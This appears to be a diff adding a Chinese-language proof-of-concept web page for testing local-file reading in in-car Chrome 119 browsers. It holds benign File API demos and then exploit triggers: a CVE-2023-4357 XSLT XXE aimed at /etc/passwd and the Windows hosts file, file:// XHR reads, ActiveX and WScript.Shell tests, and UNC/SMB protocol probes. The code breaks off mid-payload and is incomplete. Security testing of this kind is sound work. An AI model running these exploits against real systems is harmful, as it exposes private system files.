@@ -1,0 +1,1243 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>车机浏览器安全测试 POC — Chrome 119 本地文件读取</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    background: #0d1117;
+    color: #c9d1d9;
+    font-family: 'Segoe UI','Microsoft YaHei',sans-serif;
+    min-height: 100vh;
+    padding: 20px;
+  }
+  h1 { text-align:center; color:#58a6ff; margin-bottom:4px; font-size:1.5em; }
+  .subtitle { text-align:center; color:#8b949e; margin-bottom:20px; font-size:0.82em; }
+  .card {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 16px;
+    margin-bottom: 14px;
+    max-width: 1000px;
+    margin-left: auto;
+    margin-right: auto;
+  }
+  .card h3 {
+    color: #58a6ff; font-size:1em; margin-bottom:6px;
+    display:flex; align-items:center; gap:10px;
+  }
+  .badge {
+    font-size:0.65em; padding:2px 10px; border-radius:10px;
+    background:#1f6feb22; color:#58a6ff; border:1px solid #1f6feb44;
+    font-weight:normal;
+  }
+  .badge.red  { background:#f8514922; color:#f85149; border-color:#f8514944; }
+  .badge.green{ background:#3fb95022; color:#3fb950; border-color:#3fb95044; }
+  .badge.yellow{ background:#d2991d22; color:#d2991d; border-color:#d2991d44; }
+  .desc { color:#8b949e; font-size:0.82em; margin-bottom:10px; }
+  .btn-row { display:flex; gap:8px; flex-wrap:wrap; margin-bottom:8px; }
+  button {
+    background:#21262d; border:1px solid #30363d; color:#c9d1d9;
+    padding:8px 16px; border-radius:6px; cursor:pointer; font-size:0.82em;
+    transition: all .15s; white-space:nowrap;
+  }
+  button:hover { background:#30363d; border-color:#58a6ff; }
+  button.primary { background:#1f6feb; border-color:#1f6feb; color:#fff; }
+  button.primary:hover { background:#388bfd; }
+  button.danger { background:#da3633; border-color:#da3633; color:#fff; }
+  button.danger:hover { background:#f85149; }
+  button.success { background:#238636; border-color:#238636; color:#fff; }
+  button.success:hover { background:#2ea043; }
+  pre {
+    background:#0d1117; border:1px solid #30363d; border-radius:6px;
+    padding:12px; max-height:350px; overflow:auto; font-family:'Consolas','Courier New',monospace;
+    font-size:0.78em; white-space:pre-wrap; word-break:break-all; display:none;
+  }
+  pre.visible { display:block; }
+  pre .c-info  { color:#58a6ff; }
+  pre .c-ok    { color:#3fb950; }
+  pre .c-err   { color:#f85149; }
+  pre .c-warn  { color:#d2991d; }
+  pre .c-path  { color:#a371f7; }
+  .drop-zone {
+    border:2px dashed #30363d; border-radius:8px; padding:20px;
+    text-align:center; color:#8b949e; cursor:pointer; transition:.2s;
+  }
+  .drop-zone:hover, .drop-zone.dragover { border-color:#58a6ff; background:#1f6feb0a; }
+  .file-list { display:none; background:#0d1117; border:1px solid #30363d; border-radius:6px; padding:8px; max-height:200px; overflow:auto; margin-bottom:8px; }
+  .file-list.visible { display:block; }
+  .file-list .item { padding:4px 8px; border-radius:3px; cursor:pointer; display:flex; justify-content:space-between; font-size:0.78em; }
+  .file-list .item:hover { background:#1f6feb22; }
+  .file-list .item .name { flex:1; overflow:hidden; text-overflow:ellipsis; }
+  .file-list .item .size { color:#8b949e; margin-left:12px; flex-shrink:0; }
+  small { color:#8b949e; font-size:0.75em; }
+  select, input[type=text] {
+    background:#0d1117; border:1px solid #30363d; color:#c9d1d9;
+    padding:7px 12px; border-radius:6px; font-size:0.82em;
+  }
+</style>
+</head>
+<body>
+
+<h1>🚗 车机浏览器安全测试 POC</h1>
+<div class="subtitle">
+  Chrome 119.0 | 共 <span id="poc-count">12</span> 个 POC 按钮
+  | 所有文件读取操作均在本地浏览器内完成，不上传服务器
+</div>
+
+<!-- ====== 环境探测 ====== -->
+<div class="card">
+  <h3>🔍 环境探测 <span class="badge green">INFO</span></h3>
+  <div class="desc">自动检测浏览器内核、操作系统、安全策略与可用 API</div>
+  <pre id="env-output" class="visible"></pre>
+</div>
+
+<!-- ====== POC 1: 单文件选择 + FileReader ====== -->
+<div class="card" id="card-1">
+  <h3>POC-1 <span class="badge">FileReader</span> <span class="badge green">需要用户交互</span></h3>
+  <div class="desc">标准 HTML5 FileReader API，选择单个文件并以多种编码读取（Text / DataURL / ArrayBuffer / BinaryString）</div>
+  <input type="file" id="f1-input" style="display:none">
+  <div class="btn-row">
+    <button class="primary" onclick="document.getElementById('f1-input').click()">📎 选择文件</button>
+    <select id="f1-method">
+      <option value="text">readAsText</option>
+      <option value="dataurl">readAsDataURL</option>
+      <option value="arraybuffer">readAsArrayBuffer</option>
+      <option value="binarystring">readAsBinaryString</option>
+    </select>
+    <input type="text" id="f1-enc" value="UTF-8" placeholder="编码" style="width:80px">
+  </div>
+  <pre id="f1-output"></pre>
+</div>
+
+<!-- ====== POC 2: 多文件批量选择 ====== -->
+<div class="card" id="card-2">
+  <h3>POC-2 <span class="badge">Multiple</span> <span class="badge green">需要用户交互</span></h3>
+  <div class="desc">批量选择多个文件，点击列表中的文件名即可预览对应内容</div>
+  <input type="file" id="f2-input" multiple style="display:none">
+  <div class="btn-row">
+    <button class="primary" onclick="document.getElementById('f2-input').click()">📚 批量选择文件</button>
+  </div>
+  <div class="file-list" id="f2-list"></div>
+  <pre id="f2-output"></pre>
+</div>
+
+<!-- ====== POC 3: webkitdirectory 文件夹选择 ====== -->
+<div class="card" id="card-3">
+  <h3>POC-3 <span class="badge">webkitdirectory</span> <span class="badge green">需要用户交互</span></h3>
+  <div class="desc">选择整个文件夹，递归读取全部文件（含子目录），可通过 webkitRelativePath 获取完整路径</div>
+  <input type="file" id="f3-input" webkitdirectory style="display:none">
+  <div class="btn-row">
+    <button class="primary" onclick="document.getElementById('f3-input').click()">📁 选择文件夹</button>
+    <button onclick="poc3ReadAll()">📖 一键读取全部文件</button>
+  </div>
+  <div class="file-list" id="f3-list"></div>
+  <pre id="f3-output"></pre>
+</div>
+
+<!-- ====== POC 4: 拖放文件/文件夹 ====== -->
+<div class="card" id="card-4">
+  <h3>POC-4 <span class="badge">Drag &amp; Drop</span> <span class="badge green">需要用户交互</span></h3>
+  <div class="desc">拖放文件/文件夹到下方区域，利用 webkitGetAsEntry 递归穿透子目录，可获取相对路径</div>
+  <div class="drop-zone" id="f4-dropzone">🎯 拖放文件或文件夹到这里</div>
+  <div class="file-list" id="f4-list"></div>
+  <pre id="f4-output"></pre>
+</div>
+
+<!-- ====== POC 5: File System Access API ====== -->
+<div class="card" id="card-5">
+  <h3>POC-5 <span class="badge">File System Access</span> <span class="badge green">需要用户交互</span></h3>
+  <div class="desc">使用现代 File System Access API 选择文件或目录（Chrome 86+），可获取文件句柄与持久权限</div>
+  <div class="btn-row">
+    <button class="primary" id="f5-btn-file">📎 showOpenFilePicker</button>
+    <button class="primary" id="f5-btn-dir">📁 showDirectoryPicker</button>
+  </div>
+  <div class="file-list" id="f5-list"></div>
+  <pre id="f5-output"></pre>
+</div>
+
+<!-- ====== POC 6: 剪贴板粘贴 ====== -->
+<div class="card" id="card-6">
+  <h3>POC-6 <span class="badge">Clipboard</span> <span class="badge green">需要用户交互</span></h3>
+  <div class="desc">从系统剪贴板粘贴文件（截图、复制的文件等），通过 paste 事件读取 clipboardData</div>
+  <div class="drop-zone" id="f6-zone" tabindex="0">📌 点击此处，然后按 Ctrl+V 粘贴文件</div>
+  <div class="file-list" id="f6-list"></div>
+  <pre id="f6-output"></pre>
+</div>
+
+<!-- ====== POC 7: CVE-2023-4357 Chrome XXE ====== -->
+<div class="card" id="card-7">
+  <h3>POC-7 <span class="badge red">CVE-2023-4357</span> <span class="badge yellow">Chrome &lt;116</span></h3>
+  <div class="desc">Chrome XSLT XXE 漏洞。利用 XSLT document() 函数通过 file:// 协议读取本地文件。影响 Chrome 116.0.5845.96 之前版本</div>
+  <div class="btn-row">
+    <button class="danger" onclick="poc7TriggerXXE('/etc/passwd')">🐧 读取 /etc/passwd</button>
+    <button class="danger" onclick="poc7TriggerXXE('/etc/hostname')">🐧 读取 /etc/hostname</button>
+    <button class="danger" onclick="poc7TriggerXXE('C:/Windows/System32/drivers/etc/hosts')">🪟 读取 Windows hosts</button>
+    <input type="text" id="f7-path" value="C:/Windows/win.ini" placeholder="自定义路径" style="width:200px">
+    <button class="danger" onclick="poc7TriggerXXE(document.getElementById('f7-path').value)">⚡ 读取自定义路径</button>
+  </div>
+  <pre id="f7-output"></pre>
+  <div id="f7-iframe-container"></div>
+</div>
+
+<!-- ====== POC 8: file:// 协议直接访问 ====== -->
+<div class="card" id="card-8">
+  <h3>POC-8 <span class="badge red">file:// 协议</span> <span class="badge yellow">需从 file:// 打开</span></h3>
+  <div class="desc">当本页面通过 file:// 协议打开时，尝试使用 XMLHttpRequest / fetch / iframe 直接读取同目录或已知路径的文件</div>
+  <div class="btn-row">
+    <button class="danger" onclick="poc8XHRRead('.')">📂 XHR 读取当前目录</button>
+    <button class="danger" onclick="poc8XHRRead('file-reader.html')">📄 XHR 读取 file-reader.html</button>
+    <button class="danger" onclick="poc8XHRRead('../')">📂 XHR 读取上级目录</button>
+    <input type="text" id="f8-path" value="file:///etc/passwd" placeholder="file://路径" style="width:220px">
+    <button class="danger" onclick="poc8XHRRead(document.getElementById('f8-path').value)">⚡ XHR 自定义路径</button>
+    <button class="danger" onclick="poc8IframeRead()">🖼️ iframe 加载测试</button>
+    <button class="danger" onclick="poc8FetchRead()">🌐 fetch 读取测试</button>
+  </div>
+  <pre id="f8-output"></pre>
+  <div id="f8-iframe-container"></div>
+</div>
+
+<!-- ====== POC 9: ActiveX (IE/旧WebView) ====== -->
+<div class="card" id="card-9">
+  <h3>POC-9 <span class="badge red">ActiveX</span> <span class="badge yellow">仅IE/旧WebView</span></h3>
+  <div class="desc">利用 ActiveX Scripting.FileSystemObject 读取本地文件系统。仅适用于 IE 内核或支持 ActiveX 的旧版车机 WebView</div>
+  <div class="btn-row">
+    <button class="danger" onclick="poc9ActiveXRead('C:\\Windows\\win.ini')">🪟 读取 win.ini</button>
+    <button class="danger" onclick="poc9ActiveXRead('C:\\Windows\\System32\\drivers\\etc\\hosts')">🪟 读取 hosts</button>
+    <input type="text" id="f9-path" value="C:\example.txt" placeholder="文件路径" style="width:200px">
+    <button class="danger" onclick="poc9ActiveXRead(document.getElementById('f9-path').value)">⚡ 自定义路径</button>
+    <button class="danger" onclick="poc9ActiveXListDir('C:\\')">📂 列出 C:\ 目录</button>
+    <button class="danger" onclick="poc9WshShell()">💣 测试 WScript.Shell</button>
+  </div>
+  <pre id="f9-output"></pre>
+</div>
+
+<!-- ====== POC 10: 特殊协议与URI Scheme ====== -->
+<div class="card" id="card-10">
+  <h3>POC-10 <span class="badge red">协议利用</span> <span class="badge yellow">协议探测</span></h3>
+  <div class="desc">探测 file:// / mhtml: / javascript: / vbscript: 等 URI scheme 在浏览器中的可用情况</div>
+  <div class="btn-row">
+    <button class="danger" onclick="poc10ProbeProtocol('file:///etc/passwd')">🔍 探测 file://</button>
+    <button class="danger" onclick="poc10ProbeProtocol('mhtml:file:///etc/passwd')">🔍 探测 mhtml:</button>
+    <button class="danger" onclick="poc10ProbeProtocol('javascript:void(0)')">🔍 探测 javascript:</button>
+    <button class="danger" onclick="poc10ProbeProtocol('vbscript:msgbox(1)')">🔍 探测 vbscript:</button>
+    <button class="danger" onclick="poc10TestUNC()">🔍 探测 UNC 路径 (SMB)</button>
+    <button class="danger" onclick="poc10TestContentTypeSniff()">🔍 Content-Type 嗅探测试</button>
+  </div>
+  <pre id="f10-output"></pre>
+</div>
+
+<!-- ====== POC 11: Service Worker / Cache 利用 ====== -->
+<div class="card" id="card-11">
+  <h3>POC-11 <span class="badge red">SW/Cache</span> <span class="badge yellow">高级利用</span></h3>
+  <div class="desc">利用 Service Worker 拦截请求、Cache API 缓存敏感内容、Blob URL 构造等高级技巧</div>
+  <div class="btn-row">
+    <button class="danger" onclick="poc11TestServiceWorker()">🔍 SW 可用性检测</button>
+    <button class="danger" onclick="poc11CacheTest()">🔍 Cache API 测试</button>
+    <button class="danger" onclick="poc11BlobTest()">🔍 Blob URL 构造测试</button>
+    <button class="danger" onclick="poc11ObjectURLCreate()">🔍 createObjectURL 泄露测试</button>
+  </div>
+  <pre id="f11-output"></pre>
+</div>
+
+<!-- ====== POC 12: CSS/图片 侧信道读取 ====== -->
+<div class="card" id="card-12">
+  <h3>POC-12 <span class="badge red">侧信道</span> <span class="badge yellow">CSS/时序</span></h3>
+  <div class="desc">利用 CSS background-image 请求本地文件、img/object/link 标签加载本地资源进行侧信道探测</div>
+  <div class="btn-row">
+    <button class="danger" onclick="poc12CSSProbe()">🎨 CSS 背景图探测</button>
+    <button class="danger" onclick="poc12ImgProbe()">🖼️ img 标签探测</button>
+    <button class="danger" onclick="poc12ObjectProbe()">📦 object 标签探测</button>
+    <button class="danger" onclick="poc12LinkPrefetch()">🔗 link prefetch 探测</button>
+    <button class="danger" onclick="poc12TimingProbe()">⏱️ 时序侧信道探测</button>
+  </div>
+  <pre id="f12-output"></pre>
+</div>
+
+<script>
+// ==================== 环境探测 ====================
+(function detectEnv() {
+  var out = document.getElementById('env-output');
+  var ua = navigator.userAgent;
+  var lines = [];
+  lines.push('UserAgent: ' + ua);
+
+  var m = ua.match(/Chrome\/(\d+\.\d+)/);   if(m) lines.push('Chrome 内核版本: ' + m[1]);
+  m = ua.match(/Android\s([\d\.]+)/i);       if(m) lines.push('Android 版本: ' + m[1]);
+  m = ua.match(/OpenHarmony\s([\d\.]+)/i);   if(m) lines.push('OpenHarmony 版本: ' + m[1]);
+  m = ua.match(/iPhone\sOS\s([\d_]+)/i);     if(m) lines.push('iOS 版本: ' + m[1].replace(/_/g,'.'));
+  m = ua.match(/Linux;.+?(\d+\.\d+)/);        if(m) lines.push('Linux 内核标识: ' + m[1]);
+  m = ua.match(/Windows\sNT\s([\d\.]+)/);     if(m) lines.push('Windows NT: ' + m[1]);
+  m = ua.match(/MicroMessenger\/([\d\.]+)/i); if(m) lines.push('微信版本: ' + m[1]);
+
+  lines.push('');
+  lines.push('协议: ' + location.protocol);
+  lines.push('主机: ' + location.host);
+  lines.push('路径: ' + location.pathname);
+  lines.push('');
+  lines.push('Cookie 可用: ' + navigator.cookieEnabled);
+  lines.push('触摸支持: ' + ('ontouchstart' in window));
+  lines.push('语言: ' + navigator.language);
+  lines.push('平台: ' + navigator.platform);
+  lines.push('在线状态: ' + navigator.onLine);
+  lines.push('');
+  lines.push('ActiveX 可用: ' + (typeof ActiveXObject !== 'undefined'));
+  lines.push('FileReader 可用: ' + (typeof FileReader !== 'undefined'));
+  lines.push('File System Access: ' + ('showOpenFilePicker' in window));
+  lines.push('Service Worker: ' + ('serviceWorker' in navigator));
+  lines.push('webkitGetAsEntry: ' + (typeof DataTransferItem !== 'undefined' && 'webkitGetAsEntry' in DataTransferItem.prototype));
+  lines.push('createObjectURL: ' + (typeof URL !== 'undefined' && 'createObjectURL' in URL));
+  lines.push('WebSocket: ' + (typeof WebSocket !== 'undefined'));
+  lines.push('Worker: ' + (typeof Worker !== 'undefined'));
+
+  out.textContent = lines.join('\n');
+})();
+
+// ==================== 工具函数 ====================
+function formatSize(b) {
+  if(b===0) return '0 B';
+  var k=1024, s=['B','KB','MB','GB'], i=Math.floor(Math.log(b)/Math.log(k));
+  return parseFloat((b/Math.pow(k,i)).toFixed(2))+' '+s[i];
+}
+function $(id){ return document.getElementById(id); }
+function show(id){ $(id).classList.add('visible'); }
+function hide(id){ $(id).classList.remove('visible'); }
+function clearPre(id){ var el=$(id); el.classList.remove('visible'); el.textContent=''; }
+function out(id, text, cls){
+  var el=$(id); el.classList.add('visible');
+  var s = document.createElement('span');
+  s.className = cls||''; s.textContent = text;
+  el.appendChild(s);
+}
+
+function readFileAs(file, method, encoding) {
+  return new Promise(function(resolve, reject) {
+    var reader = new FileReader();
+    reader.onload = function() { resolve({name:file.name,size:file.size,type:file.type,lastModified:file.lastModified,data:reader.result}); };
+    reader.onerror = function() { reject(reader.error); };
+    switch(method) {
+      case 'text': reader.readAsText(file, encoding||'UTF-8'); break;
+      case 'dataurl': reader.readAsDataURL(file); break;
+      case 'arraybuffer': reader.readAsArrayBuffer(file); break;
+      case 'binarystring': reader.readAsBinaryString(file); break;
+      default: reader.readAsText(file); break;
+    }
+  });
+}
+
+function truncate(str, max) {
+  if(!str || str.length<=max) return str||'(空)';
+  return str.substring(0,max)+'\n... [截断，总长度:'+str.length+']';
+}
+
+// ==================== POC-1: 单文件选择 ====================
+$('f1-input').addEventListener('change', async function(){
+  clearPre('f1-output');
+  var file=this.files[0]; if(!file) return;
+  var method=$('f1-method').value;
+  var enc=$('f1-enc').value||'UTF-8';
+  out('f1-output','📄 文件: '+file.name+'\n','c-path');
+  out('f1-output','📏 大小: '+formatSize(file.size)+' | 类型: '+ (file.type||'未知')+'\n','c-info');
+  out('f1-output','🕐 修改时间: '+new Date(file.lastModified).toLocaleString()+'\n','c-info');
+  out('f1-output','📖 读取方式: '+method+' ('+enc+')\n','c-info');
+  out('f1-output','━'.repeat(50)+'\n','');
+  try{
+    var r=await readFileAs(file,method,enc);
+    var display;
+    if(method==='arraybuffer'){
+      var arr=new Uint8Array(r.data);
+      display='ArrayBuffer ('+arr.byteLength+' bytes)\n';
+      display+='Hex(前256): '+Array.from(arr.slice(0,256)).map(function(b){return b.toString(16).padStart(2,'0')}).join(' ')+'\n';
+      display+='UTF-8解码: '+new TextDecoder('utf-8').decode(arr.slice(0,1024));
+    } else if(method==='dataurl') {
+      display=truncate(r.data,800);
+    } else {
+      display=truncate(r.data,5000);
+    }
+    out('f1-output',display,'c-ok');
+    out('f1-output','\n✅ 读取完成\n','c-ok');
+  } catch(err) {
+    out('f1-output','❌ 失败: '+err.message+'\n','c-err');
+  }
+});
+
+// ==================== POC-2: 多文件选择 ====================
+$('f2-input').addEventListener('change', async function(){
+  var files=Array.from(this.files);
+  clearPre('f2-output');
+  var list=$('f2-list'); list.innerHTML=''; list.classList.remove('visible');
+  if(!files.length) return;
+  list.classList.add('visible');
+  list.innerHTML='<div style="color:#58a6ff;padding:4px 8px;">已选 '+files.length+' 个文件:</div>';
+  files.forEach(function(f){
+    var div=document.createElement('div'); div.className='item';
+    div.innerHTML='<span class="name">📄 '+f.name+'</span><span class="size">'+formatSize(f.size)+'</span>';
+    div.onclick=async function(){
+      clearPre('f2-output');
+      out('f2-output','📄 '+f.name+'\n','c-path');
+      out('f2-output','📏 '+formatSize(f.size)+' | '+ (f.type||'未知')+'\n','c-info');
+      try{
+        var r=await readFileAs(f,'text','UTF-8');
+        out('f2-output',truncate(r.data,5000),'c-ok');
+        out('f2-output','\n✅ 完成\n','c-ok');
+      } catch(err) { out('f2-output','❌ '+err.message+'\n','c-err'); }
+    };
+    list.appendChild(div);
+  });
+});
+
+// ==================== POC-3: webkitdirectory ====================
+var poc3Files=[];
+$('f3-input').addEventListener('change', function(){
+  poc3Files=Array.from(this.files);
+  clearPre('f3-output');
+  var list=$('f3-list'); list.innerHTML=''; list.classList.remove('visible');
+  if(!poc3Files.length) return;
+  list.classList.add('visible');
+  var rootName=poc3Files[0].webkitRelativePath.split('/')[0];
+  list.innerHTML='<div style="color:#58a6ff;padding:4px 8px;">📁 '+rootName+' ('+poc3Files.length+' 个文件)</div>';
+
+  // Build tree
+  var tree={};
+  poc3Files.forEach(function(f){
+    var parts=f.webkitRelativePath.split('/');
+    var node=tree;
+    parts.forEach(function(p,i){
+      if(i===parts.length-1){
+        if(!node._f) node._f=[];
+        node._f.push(f);
+      } else {
+        if(!node[p]) node[p]={};
+        node=node[p];
+      }
+    });
+  });
+
+  function renderTree(node, depth){
+    Object.keys(node).filter(function(k){return k!=='_f'}).sort().forEach(function(name){
+      var div=document.createElement('div'); div.className='item';
+      div.innerHTML='<span class="name" style="color:#58a6ff">'+'&nbsp;'.repeat(depth*4)+'📁 '+name+'/</span>';
+      list.appendChild(div);
+      renderTree(node[name], depth+1);
+    });
+    if(node._f){
+      node._f.forEach(function(f){
+        var div=document.createElement('div'); div.className='item';
+        div.innerHTML='<span class="name">'+'&nbsp;'.repeat(depth*4)+'📄 '+f.name+'</span><span class="size">'+formatSize(f.size)+'</span>';
+        div.onclick=async function(){
+          clearPre('f3-output');
+          out('f3-output','📄 '+f.webkitRelativePath+'\n','c-path');
+          out('f3-output','📏 '+formatSize(f.size)+'\n','c-info');
+          try{
+            var r=await readFileAs(f,'text','UTF-8');
+            out('f3-output',truncate(r.data,5000),'c-ok');
+            out('f3-output','\n✅ 完成\n','c-ok');
+          } catch(err) { out('f3-output','❌ '+err.message+'\n','c-err'); }
+        };
+        list.appendChild(div);
+      });
+    }
+  }
+  renderTree(tree, 0);
+});
+
+async function poc3ReadAll(){
+  clearPre('f3-output');
+  if(!poc3Files.length){ out('f3-output','⚠️ 请先选择一个文件夹\n','c-warn'); return; }
+  out('f3-output','📂 开始读取 '+poc3Files.length+' 个文件...\n\n','c-info');
+  for(var i=0;i<poc3Files.length;i++){
+    var f=poc3Files[i];
+    out('f3-output','📄 '+f.webkitRelativePath+' ','c-path');
+    try{
+      var r=await readFileAs(f,'text','UTF-8');
+      out('f3-output','→ '+formatSize(f.size)+' | '+r.data.length+' 字符\n','c-ok');
+    } catch(err) { out('f3-output','→ ❌ '+err.message+'\n','c-err'); }
+  }
+  out('f3-output','\n✅ 批量读取完成\n','c-ok');
+}
+
+// ==================== POC-4: 拖放 ====================
+var poc4Entries=[];
+(function(){
+  var dz=$('f4-dropzone');
+  ['dragenter','dragover'].forEach(function(e){ dz.addEventListener(e,function(ev){ ev.preventDefault(); dz.classList.add('dragover'); }); });
+  ['dragleave','drop'].forEach(function(e){ dz.addEventListener(e,function(ev){ ev.preventDefault(); dz.classList.remove('dragover'); }); });
+  dz.addEventListener('drop', async function(e){
+    var items=e.dataTransfer.items;
+    clearPre('f4-output'); var list=$('f4-list'); list.innerHTML=''; list.classList.remove('visible');
+    poc4Entries=[];
+    if(!items.length){ out('f4-output','⚠️ 未检测到文件\n','c-warn'); return; }
+    list.classList.add('visible'); list.innerHTML='<div style="color:#58a6ff;padding:4px 8px;">扫描中...</div>';
+    out('f4-output','🔍 扫描 '+items.length+' 个条目...\n','c-info');
+
+    async function collect(item, path){
+      var entry=item.webkitGetAsEntry?item.webkitGetAsEntry():null;
+      if(!entry){ var f=item.getAsFile(); if(f){ f._rp=path+f.name; poc4Entries.push(f); } return; }
+      if(entry.isFile){
+        var f=await new Promise(function(r){ entry.file(r); });
+        f._rp=path+entry.name; poc4Entries.push(f);
+      } else if(entry.isDirectory){
+        var reader=entry.createReader();
+        var subs=await new Promise(function(resolve){
+          var all=[];
+          (function readBatch(){
+            reader.readEntries(function(entries){
+              if(entries.length){ all=all.concat(entries); readBatch(); }
+              else resolve(all);
+            });
+          })();
+        });
+        for(var i=0;i<subs.length;i++){ await collect({webkitGetAsEntry:function(){return subs[i];}}, path+entry.name+'/'); }
+      }
+    }
+    for(var i=0;i<items.length;i++){ await collect(items[i],''); }
+
+    out('f4-output','✅ 发现 '+poc4Entries.length+' 个文件\n','c-ok');
+    list.innerHTML='<div style="color:#58a6ff;padding:4px 8px;">拖放文件 ('+poc4Entries.length+'):</div>';
+    poc4Entries.forEach(function(f){
+      var div=document.createElement('div'); div.className='item';
+      div.innerHTML='<span class="name">📄 '+(f._rp||f.name)+'</span><span class="size">'+formatSize(f.size)+'</span>';
+      div.onclick=async function(){
+        clearPre('f4-output');
+        out('f4-output','📄 '+(f._rp||f.name)+'\n','c-path');
+        out('f4-output','📏 '+formatSize(f.size)+' | '+ (f.type||'未知')+'\n','c-info');
+        try{
+          var r=await readFileAs(f,'text','UTF-8');
+          out('f4-output',truncate(r.data,5000),'c-ok');
+          out('f4-output','\n✅ 完成\n','c-ok');
+        } catch(err) { out('f4-output','❌ '+err.message+'\n','c-err'); }
+      };
+      list.appendChild(div);
+    });
+  });
+})();
+
+// ==================== POC-5: File System Access API ====================
+$('f5-btn-file').addEventListener('click', async function(){
+  clearPre('f5-output'); var list=$('f5-list'); list.innerHTML=''; list.classList.remove('visible');
+  if(!('showOpenFilePicker' in window)){
+    out('f5-output','❌ 当前浏览器不支持 File System Access API (需要 Chrome 86+)\n','c-err');
+    return;
+  }
+  try{
+    var handles=await window.showOpenFilePicker({multiple:true});
+    list.classList.add('visible');
+    list.innerHTML='<div style="color:#58a6ff;padding:4px 8px;">已选 '+handles.length+' 个文件:</div>';
+    for(var i=0;i<handles.length;i++){
+      var h=handles[i], file=await h.getFile();
+      var div=document.createElement('div'); div.className='item';
+      div.innerHTML='<span class="name">🔐 '+file.name+'</span><span class="size">'+formatSize(file.size)+'</span>';
+      (function(h,file){
+        div.onclick=async function(){
+          clearPre('f5-output');
+          out('f5-output','🔐 '+file.name+'\n','c-path');
+          out('f5-output','📏 '+formatSize(file.size)+' | '+ (file.type||'未知')+'\n','c-info');
+          try{
+            var text=await file.text();
+            out('f5-output',truncate(text,5000),'c-ok');
+            out('f5-output','\n✅ 完成\n','c-ok');
+          } catch(err) { out('f5-output','❌ '+err.message+'\n','c-err'); }
+        };
+      })(h,file);
+      list.appendChild(div);
+    }
+  } catch(err) { if(err.name!=='AbortError') out('f5-output','❌ '+err.message+'\n','c-err'); }
+});
+
+$('f5-btn-dir').addEventListener('click', async function(){
+  clearPre('f5-output'); var list=$('f5-list'); list.innerHTML=''; list.classList.remove('visible');
+  if(!('showDirectoryPicker' in window)){
+    out('f5-output','❌ 不支持 showDirectoryPicker\n','c-err'); return;
+  }
+  try{
+    var dirHandle=await window.showDirectoryPicker();
+    list.classList.add('visible');
+    list.innerHTML='<div style="color:#58a6ff;padding:4px 8px;">📁 '+dirHandle.name+' (扫描中...)</div>';
+    var allFiles=[];
+    async function scanDir(handle, path){
+      for await(var entry of handle.values()){
+        var fullPath=path+'/'+entry.name;
+        if(entry.kind==='file'){ allFiles.push({handle:entry,path:fullPath}); }
+        else if(entry.kind==='directory'){ await scanDir(entry, fullPath); }
+      }
+    }
+    // values() might not be available in older Chrome, use entries() instead
+    if(typeof dirHandle.values==='function'){
+      for await(var entry of dirHandle.values()){
+        var fullPath=dirHandle.name+'/'+entry.name;
+        if(entry.kind==='file'){ allFiles.push({handle:entry,path:fullPath}); }
+        else if(entry.kind==='directory'){ await scanDir(entry, fullPath); }
+      }
+    } else {
+      // Fallback: use entries()
+      for await(var entry of dirHandle.entries()){
+        var fullPath=dirHandle.name+'/'+entry[0];
+        if(entry[1].kind==='file'){ allFiles.push({handle:entry[1],path:fullPath}); }
+        else if(entry[1].kind==='directory'){ await scanDir(entry[1], fullPath); }
+      }
+    }
+    list.innerHTML='<div style="color:#58a6ff;padding:4px 8px;">📁 '+dirHandle.name+' ('+allFiles.length+' 个文件)</div>';
+    for(var i=0;i<allFiles.length;i++){
+      (function(item){
+        item.handle.getFile().then(function(file){
+          var div=document.createElement('div'); div.className='item';
+          div.innerHTML='<span class="name">🔐 📄 '+item.path+'</span><span class="size">'+formatSize(file.size)+'</span>';
+          div.onclick=async function(){
+            clearPre('f5-output');
+            out('f5-output','🔐 '+item.path+'\n','c-path');
+            out('f5-output','📏 '+formatSize(file.size)+' | '+ (file.type||'未知')+'\n','c-info');
+            try{
+              var text=await file.text();
+              out('f5-output',truncate(text,5000),'c-ok');
+              out('f5-output','\n✅ 完成\n','c-ok');
+            } catch(err) { out('f5-output','❌ '+err.message+'\n','c-err'); }
+          };
+          list.appendChild(div);
+        });
+      })(allFiles[i]);
+    }
+  } catch(err) { if(err.name!=='AbortError') out('f5-output','❌ '+err.message+'\n','c-err'); }
+});
+
+// ==================== POC-6: 剪贴板 ====================
+(function(){
+  function handlePaste(e){
+    var items=e.clipboardData.items;
+    clearPre('f6-output'); var list=$('f6-list'); list.innerHTML=''; list.classList.remove('visible');
+    var files=[];
+    for(var i=0;i<items.length;i++){ if(items[i].kind==='file') files.push(items[i].getAsFile()); }
+    if(!files.length){ out('f6-output','⚠️ 剪贴板中无文件数据\n','c-warn'); return; }
+    list.classList.add('visible');
+    list.innerHTML='<div style="color:#58a6ff;padding:4px 8px;">剪贴板文件 ('+files.length+'):</div>';
+    files.forEach(function(file){
+      var div=document.createElement('div'); div.className='item';
+      div.innerHTML='<span class="name">📋 '+(file.name||'(未命名)')+'</span><span class="size">'+formatSize(file.size)+'</span>';
+      div.onclick=async function(){
+        clearPre('f6-output');
+        out('f6-output','📋 剪贴板: '+(file.name||'(未命名)')+'\n','c-path');
+        out('f6-output','📏 '+formatSize(file.size)+' | '+ (file.type||'未知')+'\n','c-info');
+        try{
+          var r=await readFileAs(file,'text','UTF-8');
+          out('f6-output',truncate(r.data,5000),'c-ok');
+          out('f6-output','\n✅ 完成\n','c-ok');
+        } catch(err) { out('f6-output','❌ '+err.message+'\n','c-err'); }
+      };
+      list.appendChild(div);
+    });
+  }
+  $('f6-zone').addEventListener('paste', handlePaste);
+  document.addEventListener('paste', function(e){
+    var hasFile=false;
+    for(var i=0;i<(e.clipboardData.items||[]).length;i++){ if(e.clipboardData.items[i].kind==='file'){ hasFile=true; break; } }
+    if(hasFile && document.activeElement!==$('f6-zone')){ handlePaste(e); $('card-6').scrollIntoView({behavior:'smooth'}); }
+  });
+})();
+
+// ==================== POC-7: CVE-2023-4357 Chrome XXE ====================
+function poc7TriggerXXE(filePath) {
+  clearPre('f7-output');
+  var container=$('f7-iframe-container'); container.innerHTML='';
+  out('f7-output','🎯 目标文件: '+filePath+'\n','c-info');
+  out('f7-output','⏳ 正在构造 XSLT XXE payload...\n','c-info');
+
+  // URL-encode the file path for inclusion in the XXE entity
+  var encodedPath=encodeURIComponent(filePath);
+
+  // XSLT with external entity via document() function
+  var xslt='<?xml version="1.0"?>\n'+
